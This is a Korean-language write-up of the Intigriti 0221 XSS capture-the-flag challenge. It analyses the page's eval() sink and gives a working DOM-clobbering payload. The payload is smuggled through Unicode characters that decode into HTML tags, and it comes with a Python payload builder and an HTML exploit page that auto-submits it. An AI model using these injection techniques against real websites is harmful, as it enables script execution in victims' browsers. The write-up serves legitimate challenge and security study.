# Analysis

```js
function startGrade() {
  var text = document.getElementById("assignmentText").value;
  checkLength(text);
  result = window.result || {
    message: "Your submission is too short.",
    error: 1,
  }; //If the result object hasn't been defined yet, the submission must be too short
  if (result.error) {
    endGrade();
  } else {
    getQAnswer();
    if (!passQuiz()) {
      result.message = "We don't allow robots at the Unicodeversity (yet)!";
      result.error = 1;
    } else {
      result.grade = "ABCDEF"[Math.floor(Math.random() * 6)]; //Don't tell the students we don't actually read their submissions
    }
    endGrade();
  }
}

function endGrade() {
  document.getElementById("message").innerText = result.message;
  if (result.grade) {
    document.getElementById(
      "grade"
    ).innerText = `You got a(n) ${result.grade}!`;
  }
  document.getElementById("share").style.visibility = "initial";
  document.getElementById(
    "share-link"
  ).href = `https://challenge-0221.intigriti.io/?assignmentTitle=${
    document.getElementById("assignmentTitle").value
  }&assignmentText=${document.getElementById("assignmentText").value}`;
  delete result;
}

function checkLength(text) {
  if (text.length > 50) {
    result = { message: "Thanks for your submission!" };
  }
}

function getQAnswer() {
  var answer = document.getElementById("answer").value;
  if (/^[0-9]+$/.test(answer)) {
    if (typeof result !== "undefined") {
      result.questionAnswer = { value: answer };
    } else {
      result = { questionAnswer: { value: answer } };
    }
  }
}

function passQuiz() {
  if (typeof result.questionAnswer !== "undefined") {
    return eval(result.questionAnswer.value + " == " + question);
  }
  return false;
}

var question = `${Math.floor(Math.random() * 10) + 1} + ${
  Math.floor(Math.random() * 10) + 1
}`;

document.getElementById("question").innerText = `${question} = ?`;

document.getElementById("submit").addEventListener("click", startGrade);

const urlParams = new URLSearchParams(location.search);
if (urlParams.has("autosubmit")) {
  startGrade();
}
``` 
`passQuiz()` 함수를 보면 `result.questionAnswer.value`와 `question`의 값을 가져와서 `eval()` 함수로 실행 시켜주는 것을 볼 수 있다.

```js
function startGrade() {
  var text = document.getElementById("assignmentText").value;
  checkLength(text);
  result = window.result || {
    message: "Your submission is too short.",
    error: 1,
  }; //If the result object hasn't been defined yet, the submission must be too short
  if (result.error) {
    endGrade();
  } else {
    getQAnswer();
    if (!passQuiz()) {
      result.message = "We don't allow robots at the Unicodeversity (yet)!";
      result.error = 1;
    } else {
      result.grade = "ABCDEF"[Math.floor(Math.random() * 6)]; //Don't tell the students we don't actually read their submissions
    }
    endGrade();
  }
}
```
그래서 `result`가 어디서 정의 되는 지 확인을 해보니, `startGrade()` 함수에서 `window.result` 또는 `~~~` 값을 `result`의 값으로 넣어주는 것을 확인 할 수 있다.

```js
  result = window.result || {
    message: "Your submission is too short.",
    error: 1,
  };
```
`eval()` 함수 내부에서는 `result.questionAnswer.value` 값을 이용하는 것을 볼 수 있었다. 그렇기 때문에 window.result의 값으로 우리가 원하는 값을 넣어주면 된다. 위와 같이 특정 객체의 프로퍼티를 이용해서 값을 긁어 오는 경우 Dom Clobbering을 이용해서 값을 조작할 수 있다.

```html
<input id='result'><input id='result' name='questionAnswer' value='alert(1)//'></form>
<script>
    result = window.result || {
        message: "Your submission is too short.",
        error: 1,
    };

    (function passQuiz() {
        if (typeof result.questionAnswer !== "undefined") {
            return eval(result.questionAnswer.value + " == ");
        }
            return false;
    })();
</script>
```
간단한 `POC`를 작성해보면 위와 같다. ( 이미 input 태그와 form 태그는 사용 중 이기 때문에 익스를 할 때는 input 태그와 form를 이용 할 수 없다. 그래서 value 속성이 있는 다른 태그를 사용해 주어야 한다. )

![](https://github.com/wjddnjs33/Exploit/blob/main/wargame/xss%20challenge/Intigriti%200221/images/1.png?raw=true)

`POC`를 실행 해보면 `XSS`가 트리거 되는 것을 확인 할 수 있다. 그렇기에 `Tag Injection` 취약점을 찾아서 Dom Clobbering을 해주면 된다.

---
# Sollution

```python
import requests

chars = ['>', '"', '<da']
_chars = ['3E00', '2200', '3Cda']

i = 0
for c in _chars:
    url = f'https://unicode-table.com/en/{c}/'
    result = requests.get(url).text
    unicode_char = result.split('<span id="char-node" style="font-family:')[1].split('</span>')[0].split('>')[1]
    print(chars[i] + ' => ' + unicode_char)
    _chars[i] = unicode_char
    i = i + 1

payload = "\"><data id='result'><data id='result' name='questionAnswer' value='alert(origin)//'>"
for i in range(len(chars)):
    payload = payload.replace(chars[i], _chars[i])
print('XSS Payload => ' + payload)
    
'''
PS C:\Users\pocas\Desktop\Intigriti 0221> python3 .\a.py
> => 㸀
" => ∀
<da => 㳚
XSS Payload => ∀㸀㳚ta id='result'㸀㳚ta id='result' name='questionAnswer' value='alert(1)//'㸀
'''
```

```html
<!DOCTYPE html>
<html>
    <head>
        <title>Intigriti 0221 Poc</title>
        <script>
            // unicode 문자가 변환 되면서 뒤에 널 바이트가 붙는다. '>' 문자는 '>00'와 같이 되기 때문에 상관 없는데, '<' 문자는 '<00'와 같이 되기 때문에 태그를 사용 할 수 없게 된다. 그렇기 때문에 `<` 뒤에 문자열을 이어줬다. 널 바이트 때문에 조금 애 먹었음 zz
            const payload = "∀㸀㳚ta id='result'㸀㳚ta id='result' name='questionAnswer' value='alert(origin)//'㸀";
            console.log(`payload : ${payload}`);

            const exploit = function(){
                let url = `https://challenge-0221.intigriti.io/?assignmentTitle=${payload}&autosubmit=1`
                window.open(url);
            }
        </script>
    </head>
    <body>
        <h1>Intigriti XSS Challenge 0221</h1>

        <h3>If you click the button below and execute poc code, You can trigger the xss.</h3>
        <input type="button" onclick=exploit() value="Trigger">
    </body>
</html>
```
